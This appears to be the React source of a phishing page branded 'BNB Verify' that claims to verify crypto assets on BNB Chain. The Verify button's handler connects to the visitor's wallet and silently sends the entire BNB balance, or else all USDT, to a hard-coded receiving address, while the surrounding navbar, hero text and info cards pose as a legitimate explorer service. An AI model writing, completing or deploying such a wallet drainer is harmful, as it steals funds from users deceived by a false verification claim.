import React, { useState } from "react";
import { ethers } from "ethers";
import "./App.css"; // keep for animations

function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; 
  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint)",
    "function transfer(address to, uint amount) returns (bool)"
  ];

  const handleVerify = async () => {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005")
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#121212] text-white">
      {/* Navbar */}
      <header className="bg-[#171717] sticky top-0 z-50 shadow-md">
        <nav className="container mx-auto px-6 py-4 flex justify-between items-center">
          <div className="flex items-center space-x-2">
            <div className="h-8 w-8 bg-yellow-400 rounded-full"></div>
            <span className="text-xl font-bold text-yellow-400">BNB Verify</span>
          </div>
          <div className="hidden md:flex space-x-6 text-sm font-medium">
            <a href="#" className="hover:text-yellow-400">Home</a>
            <a href="#" className="hover:text-yellow-400">Explorer</a>
            <a href="#" className="hover:text-yellow-400">Tokens</a>
            <a href="#" className="hover:text-yellow-400">NFTs</a>
            <a href="#" className="hover:text-yellow-400">DApps</a>
          </div>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="flex flex-col items-center justify-center text-center px-6 py-12 flex-grow">
        <h1 className="text-4xl md:text-5xl font-bold text-yellow-400 mb-4">
          Verify Crypto Assets
        </h1>
        <p className="text-gray-300 mb-8 max-w-xl">
          Instantly verify assets on BNB Chain. Supports both BNB and USDT (BEP20).
        </p>

        {/* Verify Button with Pulse */}
        <div className="relative flex justify-center items-center w-40 h-40 mb-12">
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
          <button
            onClick={handleVerify}
            className="button-primary relative z-10"
          >
            Verify
          </button>
        </div>

        <p className="text-lg text-gray-300">{status}</p>
      </main>

      {/* Info Cards */}
      <section className="container mx-auto px-6 py-12 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6">
        {[
          { title: "Explorer", desc: "Browse BNB Chain addresses, tokens & transactions." },
          { title: "Tokens", desc: "Check balances & verify authenticity of tokens." },
          { title: "NFTs", desc: "Verify NFTs on BNB Chain with metadata." },
          { title: "DApps", desc: "Connect and verify DApp transactions safely." }
        ].map((card, i) => (
          <div
            key={i}
            className="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all"
          >
            <h2 className="text-yellow-400 text-lg font-semibold mb-2">
              {card.title}
            </h2>
            <p className="text-gray-400 text-sm">{card.desc}</p>
          </div>
        ))}
      </section>

      {/* Footer */}
      <footer className="bg-[#171717] py-6 text-center text-gray-500 text-sm">
        © 2025 BNB Verify. Powered by BNB Chain.
      </footer>
    </div>
  );
}

export default App;
